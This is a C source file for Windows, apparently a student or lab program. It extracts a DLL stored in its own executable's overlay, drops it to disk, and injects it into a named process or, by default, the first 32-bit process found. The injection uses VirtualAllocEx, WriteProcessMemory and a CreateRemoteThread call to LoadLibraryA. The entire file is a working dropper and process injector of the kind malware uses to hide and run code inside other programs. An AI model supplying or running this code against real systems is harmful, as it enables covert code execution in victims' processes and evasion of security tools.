#include <windows.h>
#include <TlHelp32.h> 
#include <string.h>
#include <stdio.h>


typedef void* HANDLE;

size_t dllSize = 0;
char *dll = NULL;

int is64bit(long pid) {
    SYSTEM_INFO sysinfo;
    HANDLE hProcess;
    BOOL isWow64;

    // if OS is not 64 bit, no process will be either   
    GetNativeSystemInfo(&sysinfo);
    if (sysinfo.wProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64) 
        return 0;

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);;
    if (hProcess == NULL)
        return -1;

    if (! IsWow64Process(hProcess, &isWow64)) {
        CloseHandle(hProcess);
        return -1;
    }

    CloseHandle(hProcess);
    if (isWow64)
        return 0;
    else
        return 1;
}

//get PID of the first 32 bit process
int findPidOf32BitProcess(){
    PROCESSENTRY32 pe32;
    char process[MAX_PATH];
    if (!GetModuleFileNameA(NULL, process, MAX_PATH)){
        return 0;
    }
    char *processFileName;
    (processFileName = strrchr(process, '\\')) ? ++processFileName : (processFileName = process);   //get filename from path
   
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }
    pe32.dwSize = sizeof(PROCESSENTRY32); //according the documentation, size must be set first
    if (Process32First(hProcessSnap, &pe32)){   //get first process
        if (is64bit(pe32.th32ProcessID) == 0){ //check if is 32 bit
            if (strcmp(pe32.szExeFile, processFileName) != 0){ //compare process names
                return pe32.th32ProcessID;
            }
        }
    }
    while(Process32Next(hProcessSnap, &pe32)){
        if (is64bit(pe32.th32ProcessID) == 0){ //check if is 32 bit
            if (strcmp(pe32.szExeFile, processFileName) != 0){ //compare process names
                return pe32.th32ProcessID;
            }
        }
    }
    return 0;
}

//find PID of prcoess
int findPidOfProcess(char process[25]){
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }
    pe32.dwSize = sizeof(PROCESSENTRY32); //according the documentation, size must be set first
    if (Process32First(hProcessSnap, &pe32)){   //get first process
        if (strcmp(pe32.szExeFile, process) == 0){ //compare process names
            return pe32.th32ProcessID;
        }
    }
    while(Process32Next(hProcessSnap, &pe32)){
        if (strcmp(pe32.szExeFile, process) == 0){ //compare process names
            return pe32.th32ProcessID;
        }
    }
    return 0;
}


//get offset of overlay
int getSizeOfPeFile(){
    HMODULE baseAddress = GetModuleHandle(NULL);

    IMAGE_DOS_HEADER* IDH = (IMAGE_DOS_HEADER*)baseAddress;

    IMAGE_NT_HEADERS* INH = (IMAGE_NT_HEADERS*)((int)baseAddress + IDH->e_lfanew);

    int size = INH->OptionalHeader.SizeOfHeaders;

    DWORD sectionLocation = (DWORD)INH + sizeof(DWORD) /*PE signature*/ + (DWORD)(sizeof(IMAGE_FILE_HEADER)) + (DWORD)INH->FileHeader.SizeOfOptionalHeader;

    DWORD sectionSize = (DWORD)sizeof(IMAGE_SECTION_HEADER); //40 bytes

    DWORD importDirectoryRVA = INH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

    for (int i = 0; i < INH->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)sectionLocation;
        size = size + sectionHeader->SizeOfRawData;
        sectionLocation = sectionLocation +sectionSize;
    }

    return size;
}   

void getOverlay(){
    int offsetOfOverlay = getSizeOfPeFile();
    char *fileName = (char *)malloc(MAX_PATH);
    GetModuleFileNameA(NULL,fileName,MAX_PATH);
    if( strlen(fileName) == 0){
        perror("Could not retrive filename.\n");
        exit(EXIT_FAILURE);
    }

    FILE *fp = fopen(fileName, "rb"); // read mode

    if (fp == NULL){
        perror("Error while opening the file.\n");
        exit(EXIT_FAILURE);
    }


    long int sizeOfFile = ftell(fp);

    if ( fseek(fp, offsetOfOverlay, SEEK_SET) != 0 ) {
        perror("Could not set the file position.\n");
        exit(EXIT_FAILURE);
    }

    fread(&dllSize, 4, 1, fp); //first 4 bytes of overlay are size of the file

    dll = (char *)malloc(dllSize);

    fread(dll, 1, dllSize, fp);

    fclose(fp);
}

//create DLL on disks
char* dropDll(){
    HANDLE hFile;
    char *fileName = "remoteDllInjection.dll";

    getOverlay();

    hFile = CreateFileA(fileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //create file
    if (hFile == INVALID_HANDLE_VALUE){
        return 0;
    }
    if(WriteFile(hFile, dll, dllSize, NULL, NULL)){
        //getting absoluthe path to created DLL
        TCHAR wd[MAX_PATH] = { 0 };
        GetCurrentDirectory(MAX_PATH, wd);
        char *filePath = (char *)malloc(MAX_PATH);
        strcpy(filePath, wd);
        filePath = strcat(filePath, "\\");
        filePath = strcat(filePath, fileName);
        CloseHandle(hFile);
        return filePath;
    }
    CloseHandle(hFile);
    return 0;
}


int remoteDllInjection(char process[25]){
    int pid = 0;
    if (process[0] == 0x00){
        pid = findPidOf32BitProcess();
    }else{
        pid = findPidOfProcess(process);
    }
    
    if (pid == 0){
        return 1; //Process does not exist.
    }

    char *dllPath = (char *)dropDll();
    if (dllPath == 0){
        return 2; //DLL could not be created
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,0,pid);
    if (hProcess == INVALID_HANDLE_VALUE) {
        return 3; //Process could not be opened
    }
    
    int dllPathSize = strlen(dllPath);
    int *allocAddress;
    allocAddress = VirtualAllocEx(hProcess, NULL, dllPathSize + 1, MEM_COMMIT, PAGE_READWRITE);
    if(allocAddress == NULL){
        return 4; //Could not allocate memory in remote processse
    }

    if (WriteProcessMemory(hProcess, allocAddress, dllPath, dllPathSize, NULL) == 0){
        return 5; //Could not write to remote process
    }

    FARPROC loadLibraryAddress = NULL;
    HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32.dll"));
    if (hKernel32 != 0){
        loadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryA");
    }
    if (loadLibraryAddress == NULL){
        return 6; //Could not found LoadLibrary function
    }
    
    HANDLE hNewThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, allocAddress, 0, NULL);
    if(hNewThread == NULL){
        return 7; //Could not create remote thread
    }
    
    WaitForSingleObject(hNewThread, 200);

    if(VirtualFreeEx(hProcess, allocAddress, 0, MEM_RELEASE) == 0){
        return 8; // Could not free address in remote process
    }
    CloseHandle(hNewThread);
    CloseHandle(hProcess);
    return 0;

}


int main(int argc, char *argv[]){
    char process[25];
    if (argc > 1){ 
        //first argument shoudl be taret process name
        if(strlen(argv[1]) < 25){
            strcpy(process, argv[1]);
        }else{
            //pokial sa argument nezmensti do pola, tak sa vlozi defualtny process
            goto Default;
        }   
    }else{
        //default process name
        Default:process[0] = 0x00; // if no process name is provided, program injects dll to the fisrt 32 bit porcess found

    }

    switch (remoteDllInjection(process))
    {
    case 0:
        MessageBox(0,"Remote DLL injection successfull.","Success",0);
        return 0;
    case 1:
        MessageBox(0,"Remote DLL injection failed. Process does not exist.","Failure",0);
        return 1;
    case 2:
        MessageBox(0,"Remote DLL injection failed. DLL could not be created.","Failure",0);
        return 1;
    case 3:
        MessageBox(0,"Remote DLL injection failed. Process could not be opened.","Failure",0);
        return 1;
    case 4:
        MessageBox(0,"Remote DLL injection failed. Could not allocate memory in remote process.","Failure",0);
        return 1;
    case 5:
        MessageBox(0,"Remote DLL injection failed. Could not write to remote process.","Failure",0);
        return 1;
    case 6:
        MessageBox(0,"Remote DLL injection failed. Could not found LoadLibrary function.","Failure",0);
        return 1;
    case 7:
        MessageBox(0,"Remote DLL injection failed. Could not create remote thread.","Failure",0);
        return 1;
    case 8:
        MessageBox(0,"Remote DLL injection failed. Could not free address in remote process.","Failure",0);
        return 1;
    }
    
    return 1;
}
